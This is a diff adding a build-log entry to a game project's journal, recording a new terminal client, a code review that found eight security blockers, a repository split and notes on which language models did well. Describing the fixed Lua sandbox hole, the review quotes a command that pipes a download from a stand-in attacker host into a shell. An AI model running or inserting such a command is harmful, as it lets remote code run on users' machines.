@@ -297,3 +297,26 @@ Three components built per The Architect's kick-off brief:
 **Build status:** Clean. All three pass. Ready for end-to-end testing.
 
 **Remaining:** Run dp-agent sessions against the server. Baseline metrics (no memory). Experimental sessions (with memory). The paper writes itself once the data exists.
+
+---
+
+## [BUILD] — 2026-05-12 Night: dp-client Built, Repos Split
+
+**The human client is real.** Built a Dark Pawns terminal client from a Zif fork in five sprints across one evening. WebSocket transport, bubbletea TUI, JSONL logging, security hardening. 965 lines of production code.
+
+**Why it matters for the paper:** The dp-client feeds the same dreaming pipeline as dp-agent. Human sessions and agent sessions produce identical JSONL output. The evaluation methodology can now measure behavioral persistence across both populations. The human baseline exists.
+
+**BRENDA reviewed it.** Caught 8 blockers including a wide-open Lua sandbox (any module can `os.execute("curl evil.com | sh")`), path traversal via character names, and passwords logged to JSONL. All fixed. Her review format was excellent — severity-rated with fix instructions. Worth formalizing as a pre-ship gate.
+
+**Repo split completed.** Three repos instead of one cluttered monorepo:
+- `zax0rz/darkpawns` — server, agent CLI, dreaming, world files
+- `zax0rz/dp-client` — human client (standalone Go module)
+- `zax0rz/darkpawns-site` — Hugo website
+
+Clean boundaries. The client talks WebSocket, not Go imports. The website is static content. The server keeps the tightly coupled stuff.
+
+**Model routing lesson:** MiMo v2.5-Pro succeeds when given pre-digested context (exact changes to make), fails when asked to read files and figure things out. Kimi K2.6 delivered clean config work in one shot. Context quality matters more than model choice. This is becoming a pattern.
+
+**Net result:** Memory system, agent CLI, dreaming pipeline, human client, three repos, documentation. One session. The research apparatus is complete. The paper has its data source. Now we need to run the experiment.
+
+**Next:** Baseline sessions. First dp-agent play-through with full memory system. First human session via dp-client. The dreaming pipeline eats JSONL from both. The evaluation begins.
